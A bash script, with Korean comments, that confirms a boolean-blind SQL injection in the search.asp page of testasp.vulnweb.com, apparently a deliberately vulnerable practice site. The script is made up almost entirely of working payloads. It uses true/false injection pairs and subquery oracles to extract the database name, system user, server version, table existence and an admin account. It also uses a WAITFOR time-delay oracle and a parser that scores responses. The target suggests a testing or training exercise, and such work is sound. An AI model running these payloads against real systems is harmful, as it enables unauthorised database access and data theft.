#!/usr/bin/env bash
# Round 5 — search.asp SQLi boolean-blind 확정 (교정 페이로드: ...))-- 로 괄호 균형 유지)
set -u
BASE="http://testasp.vulnweb.com"
D="$(cd "$(dirname "$0")" && pwd)"; OUT="$D/out"; mkdir -p "$OUT"
CURL=(curl -s --noproxy '*' --max-time 30)
run() { printf "%-16s %-62s " "$1" "$2"
  "${CURL[@]}" -G --data-urlencode "tfSearch=$2" -o "$OUT/f_$1.html" \
    -w "%{http_code} %{size_download}\n" "$BASE/search.asp"; }
run_t() { printf "%-16s %-62s " "$1" "$2"
  local t0 t1
  t0=$(date +%s.%N)
  "${CURL[@]}" -G --data-urlencode "tfSearch=$2" -o "$OUT/f_$1.html" \
    -w "%{http_code} %{size_download}" "$BASE/search.asp"
  t1=$(date +%s.%N); printf " elapsed=%.2fs\n" "$(echo "$t1-$t0"|bc)"; }

echo "### 1. boolean-blind TRUE/FALSE 쌍 (rows>0 vs 0)"
printf "%-16s %-62s %s\n" LABEL PAYLOAD "CODE SIZE"
run base_test "test"
run true_1    "zzq')>0 OR (1=1))--"
run false_1   "zzq')>0 OR (1=2))--"
run true_2    "zzq')>0 OR (2>1))--"
run false_2   "zzq')>0 OR (2<1))--"
run true_alt  "zzq')>0 OR ('a'='a'))--"
run false_alt "zzq')>0 OR ('a'='b'))--"
echo
echo "### 2. 서브쿼리 오라클 (DB 사실 추출)"
run db_name_t   "zzq')>0 OR ((SELECT DB_NAME())='acuforum'))--"
run db_name_f   "zzq')>0 OR ((SELECT DB_NAME())='zzzzzz'))--"
run sysuser_t   "zzq')>0 OR ((SELECT SYSTEM_USER)='acunetix'))--"
run sysuser_f   "zzq')>0 OR ((SELECT SYSTEM_USER)='sa'))--"
run ver_like_t  "zzq')>0 OR ((SELECT @@VERSION) LIKE '%SQL Server%'))--"
run posts_gt0   "zzq')>0 OR ((SELECT COUNT(*) FROM posts)>0))--"
run users_gt0   "zzq')>0 OR ((SELECT COUNT(*) FROM users)>0))--"
run admin_exists "zzq')>0 OR (EXISTS(SELECT 1 FROM users WHERE uname='admin'))--"
echo
echo "### 3. 시간 기반 오라클 (WAITFOR) — 보조 검증"
run_t time_false "zzq')>0 OR (1=2))--"
run_t time_wait  "zzq')>0)--; WAITFOR DELAY '0:0:4'--"
echo
echo "### 4. 판정 (rows = 렌더된 게시글 수)"
python3 - <<'EOF'
import glob,os,re
for f in sorted(glob.glob("out/f_*.html")):
    s=open(f,encoding="latin-1",errors="replace").read()
    rows=s.count("class='posttext'")
    print(f"{os.path.basename(f)[2:-5]:16} {len(s):6}B rows={rows:3}  verdict={'ROWS' if rows else 'no-rows'}")
EOF
